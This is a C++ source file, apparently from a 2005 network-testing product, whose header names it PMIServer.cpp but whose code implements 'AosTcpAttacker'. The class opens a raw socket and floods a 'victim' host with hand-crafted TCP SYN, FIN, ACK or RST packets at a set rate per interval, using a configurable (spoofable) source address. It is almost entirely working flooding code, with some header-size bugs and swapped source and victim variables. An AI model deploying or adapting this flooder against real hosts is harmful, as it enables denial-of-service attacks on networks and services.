////////////////////////////////////////////////////////////////////////////
//
// Copyright (C) 2005
// Packet Engineering, Inc. All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification is not permitted unless authorized in writing by a duly
// appointed officer of Packet Engineering, Inc. or its derivatives
//
// File Name: PMIServer.cpp
// Description:
//   
//
// Modification History:
// 
////////////////////////////////////////////////////////////////////////////


#include "AttackMgr/TcpAttacker.h"

#include "AttackMgr/AttackUtil.h"
#include "Util/Random.h"

#include <signal.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>


AosTcpAttacker::AosTcpAttacker()
{
	mProtocol = eSyn;
}

AosTcpAttacker::AosTcpAttacker(const OmnIpAddr &sip,
							   const int &sport,
							   const OmnIpAddr &dip,
							   const int &dport,
							   const int &num,
							   const int &interval)
{
	mProtocol = eSyn;
	mSrcIP = sip;	
	mSrcPort = sport;	
	mDstIP = dip;	
	mDstPort = dport;	
	mNumPerSecond = num;// per second
	mCalcIntevel = interval;//ms
	mTimerSec = interval /1000;
	mTimerUSec = interval %1000 *1000;
}

AosTcpAttacker::~AosTcpAttacker()
{
}


void	
AosTcpAttacker::setStyle(const AosAttacker::Protocol protocol)
{
	switch(protocol)
	{
		case AosAttacker::eSyn:
			mProtocol = protocol;
			break;
		case AosAttacker::eFin:
			mProtocol = protocol;
			break;
		case AosAttacker::eReset:
			mProtocol = protocol;
			break;
		case AosAttacker::eAck:
			mProtocol = protocol;
			break;
		default:
			return;		
	}
	return;
}

bool		
AosTcpAttacker::unbind()
{
	return true;
}

bool		
AosTcpAttacker::sendPacket()
{
	switch(mProtocol)
	{
		case eSyn:
			for(int i = 0;i < mNumPerSecond;i++)
			{
				send_syn();
			}
			break;	
		case eFin:
			for(int i = 0;i < mNumPerSecond;i++)
			{
				send_fin();
			}
			break;	
		case eAck:
			for(int i = 0;i < mNumPerSecond;i++)
			{
				send_ack();
			}
			break;	
		case eReset:
			for(int i = 0;i < mNumPerSecond;i++)
			{
				send_reset();
			}
			break;	
		default:
			break;
	}
	return true;
}

bool		
AosTcpAttacker::send_syn()
{
	u_long victim = mSrcIP.toInt();
	u_long source = mDstIP.toInt();
	u_short port = mDstPort;
	
	int tmplen = 0;
	struct sockaddr_in sin;
	struct iphdr *ih = (struct iphdr *) mSynb;
	struct tcphdr *th = (struct tcphdr *) (mSynb + sizeof (struct iphdr));
	srandom ((time (NULL) + random ()));
	ih->version = 4;
	ih->ihl = 5;
	ih->tos = 0x00;
	ih->tot_len = sizeof (ih) + sizeof (th);
	ih->id = htons (random ());
	ih->frag_off = 0;
	ih->ttl = 255;
	ih->protocol = 6;
	ih->check = 0;
	//ih->saddr = k00lip ();
	ih->saddr = source;
	ih->daddr = victim;
	th->source = htons (RAND_INT(0,9999));
	if (port > 0)
		th->dest = htons (port);
	else
	th->dest = htons (RAND_INT(0,9999));
	th->seq = htonl (random ());
	th->doff = sizeof (th) / 4;
	th->ack_seq = htons (rand ());
	th->res1 = 0;
	th->fin = 0;
	th->syn = 1;
	th->rst = 0;
	th->psh = 0;
	th->ack = 0;
	th->urg = 1;
	th->res2 = 0;
	th->window = htons (65535);
	th->check = 0;
	th->urg_ptr = htons (rand ());
	th->check = AosAttackUtil::ip_sum((u_short *)mSynb, (sizeof (struct iphdr) + sizeof (struct tcphdr) + 1) & ~1);
	ih->check = AosAttackUtil::ip_sum ((u_short *)mSynb, (4 * ih->ihl + sizeof (struct tcphdr) + 1) & ~1);
	sin.sin_addr.s_addr = ih->saddr;
//	printf("From the source %s , ", inet_ntoa(sin.sin_addr));
	sin.sin_family = AF_INET;
	sin.sin_port = th->dest;
	sin.sin_addr.s_addr = ih->daddr;
	tmplen = sendto (mRawsock, mSynb, 4 * ih->ihl + sizeof (struct tcphdr), 0, (sockaddr *)&sin, sizeof (sin));
//	printf("Send the syn to victim %s , the content len=%d\n", inet_ntoa(sin.sin_addr), tmplen);
	return true;
}

bool		
AosTcpAttacker::send_fin()
{
	u_long victim = mSrcIP.toInt();
	u_long source = mDstIP.toInt();
	u_short port = mDstPort;

	int tmplen = 0;
	struct sockaddr_in sin;
	struct iphdr *ih = (struct iphdr *) mSynb;
	struct tcphdr *th = (struct tcphdr *) (mSynb + sizeof (struct iphdr));
	srandom ((time (NULL) + random ()));
	ih->version = 4;
	ih->ihl = 5;
	ih->tos = 0x00;
	ih->tot_len = sizeof (ih) + sizeof (th);
	ih->id = htons (random ());
	ih->frag_off = 0;
	ih->ttl = 255;
	ih->protocol = 6;
	ih->check = 0;
	//ih->saddr = k00lip ();
	ih->saddr = source;
	ih->daddr = victim;
	th->source = htons (RAND_INT(0, 9999));
	if (port > 0)
		th->dest = htons (port);
	else
	th->dest = htons (RAND_INT(0, 9999));
	th->seq = htonl (random ());
	th->doff = sizeof (th) / 4;
	th->ack_seq = htons (rand ());
	th->res1 = 0;
	th->fin = 1;
	th->syn = 0;
	th->rst = 0;
	th->psh = 0;
	th->ack = 0;
	th->urg = 1;
	th->res2 = 0;
	th->window = htons (65535);
	th->check = 0;
	th->urg_ptr = htons (rand ());
	th->check = AosAttackUtil::ip_sum ((u_short *)mSynb, (sizeof (struct iphdr) + sizeof (struct tcphdr) + 1) & ~1);
	ih->check = AosAttackUtil::ip_sum ((u_short *)mSynb, (4 * ih->ihl + sizeof (struct tcphdr) + 1) & ~1);
	sin.sin_addr.s_addr = ih->saddr;
//	printf("From the source %s , ", inet_ntoa(sin.sin_addr));
	sin.sin_family = AF_INET;
	sin.sin_port = th->dest;
	sin.sin_addr.s_addr = ih->daddr;
	tmplen = sendto (mRawsock, mSynb, 4 * ih->ihl + sizeof (struct tcphdr), 0, (sockaddr *)&sin, sizeof (sin));
//	printf("Send the fin to victim %s , the content len=%d\n", inet_ntoa(sin.sin_addr), tmplen);
	return true;
}

bool		
AosTcpAttacker::send_ack()
{
	u_long victim = mSrcIP.toInt();
	u_long source = mDstIP.toInt();
	u_short port = mDstPort;

	int tmplen = 0;
	struct sockaddr_in sin;
	struct iphdr *ih = (struct iphdr *) mSynb;
	struct tcphdr *th = (struct tcphdr *) (mSynb + sizeof (struct iphdr));
	srandom ((time (NULL) + random ()));
	ih->version = 4;
	ih->ihl = 5;
	ih->tos = 0x00;
	ih->tot_len = sizeof (ih) + sizeof (th);
	ih->id = htons (random ());
	ih->frag_off = 0;
	ih->ttl = 255;
	ih->protocol = 6;
	ih->check = 0;
	//ih->saddr = k00lip ();
	ih->saddr = source;
	ih->daddr = victim;
	th->source = htons (RAND_INT(0, 9999));
	if (port > 0)
		th->dest = htons (port);
	else
	th->dest = htons (RAND_INT(0, 9999));
	th->seq = htonl (random ());
	th->doff = sizeof (th) / 4;
	th->ack_seq = htons (rand ());
	th->res1 = 0;
	th->fin = 0;
	th->syn = 0;
	th->rst = 0;
	th->psh = 0;
	th->ack = 1;
	th->urg = 1;
	th->res2 = 0;
	th->window = htons (65535);
	th->check = 0;
	th->urg_ptr = htons (rand ());
	th->check = AosAttackUtil::ip_sum ((u_short *)mSynb, (sizeof (struct iphdr) + sizeof (struct tcphdr) + 1) & ~1);
	ih->check = AosAttackUtil::ip_sum ((u_short *)mSynb, (4 * ih->ihl + sizeof (struct tcphdr) + 1) & ~1);
	sin.sin_addr.s_addr = ih->saddr;
//	printf("From the source %s , ", inet_ntoa(sin.sin_addr));
	sin.sin_family = AF_INET;
	sin.sin_port = th->dest;
	sin.sin_addr.s_addr = ih->daddr;
	tmplen = sendto (mRawsock, mSynb, 4 * ih->ihl + sizeof (struct tcphdr), 0, (sockaddr *)&sin, sizeof (sin));
//	printf("Send the ack to victim %s , the content len=%d\n", inet_ntoa(sin.sin_addr), tmplen);
	return true;
}

bool		
AosTcpAttacker::send_reset()
{
	u_long victim = mSrcIP.toInt();
	u_long source = mDstIP.toInt();
	u_short port = mDstPort;
	
	int tmplen = 0;
	struct sockaddr_in sin;
	struct iphdr *ih = (struct iphdr *) mSynb;
	struct tcphdr *th = (struct tcphdr *) (mSynb + sizeof (struct iphdr));
	srandom ((time (NULL) + random ()));
	ih->version = 4;
	ih->ihl = 5;
	ih->tos = 0x00;
	ih->tot_len = sizeof (ih) + sizeof (th);
	ih->id = htons (random ());
	ih->frag_off = 0;
	ih->ttl = 255;
	ih->protocol = 6;
	ih->check = 0;
	//ih->saddr = k00lip ();
	ih->saddr = source;
	ih->daddr = victim;
	th->source = htons (RAND_INT(0, 9999));
	if (port > 0)
		th->dest = htons (port);
	else
	th->dest = htons (RAND_INT(0, 9999));
	th->seq = htonl (random ());
	th->doff = sizeof (th) / 4;
	th->ack_seq = htons (rand ());
	th->res1 = 0;
	th->fin = 0;
	th->syn = 0;
	th->rst = 1;
	th->psh = 0;
	th->ack = 0;
	th->urg = 1;
	th->res2 = 0;
	th->window = htons (65535);
	th->check = 0;
	th->urg_ptr = htons (rand ());
	th->check = AosAttackUtil::ip_sum ((u_short *)mSynb, (sizeof (struct iphdr) + sizeof (struct tcphdr) + 1) & ~1);
	ih->check = AosAttackUtil::ip_sum ((u_short *)mSynb, (4 * ih->ihl + sizeof (struct tcphdr) + 1) & ~1);
	sin.sin_addr.s_addr = ih->saddr;
//	printf("From the source %s , ", inet_ntoa(sin.sin_addr));
	sin.sin_family = AF_INET;
	sin.sin_port = th->dest;
	sin.sin_addr.s_addr = ih->daddr;
	tmplen = sendto (mRawsock, mSynb, 4 * ih->ihl + sizeof (struct tcphdr), 0, (sockaddr *)&sin, sizeof (sin));
//	printf("Send the rst to victim %s , the content len=%d\n", inet_ntoa(sin.sin_addr), tmplen);

	return true;
}


bool		
AosTcpAttacker::bind()
{
	mRawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt (mRawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	return true;
}

